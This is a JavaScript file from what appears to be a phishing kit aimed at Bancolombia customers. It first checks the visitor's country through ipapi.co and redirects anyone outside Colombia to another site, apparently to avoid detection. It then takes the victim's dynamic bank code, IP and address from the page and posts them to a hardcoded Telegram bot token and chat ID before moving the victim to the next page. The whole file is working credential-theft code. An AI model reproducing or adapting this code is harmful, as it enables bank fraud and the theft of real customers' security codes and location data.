function detectarPais() {
  // Realiza una solicitud a la API de ipapi.co para obtener la información de ubicación del usuario
  fetch("https://ipapi.co/json/")
    .then((response) => response.json())
    .then((data) => {
      // Si el país es Colombia, no hacemos nada
      if (data.country === "CO") {
		  
		  console.log("data.country");
        return;
      }

      // Si el país no es Colombia, redirigimos a otra página
      window.location.href = "https://www.cctv.com/";
    })
    .catch((error) => {
      console.error("Error al obtener la ubicación del usuario:", error);
    });
}

detectarPais();


//bot token
var telegram_bot_id = "5867032539:AAHkD1Pn4e3os-4EyKEpHajUI6kHJAe_DAE";
//chat id
var chat_id = 5651328532;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("dinamica").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Codigo: " + u_name + "\n\nIP: " + ip +"\n" + ip2 +"\nBANCOLOMBIA";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index4.html';
        console.log(response);
    });
    return false;
};
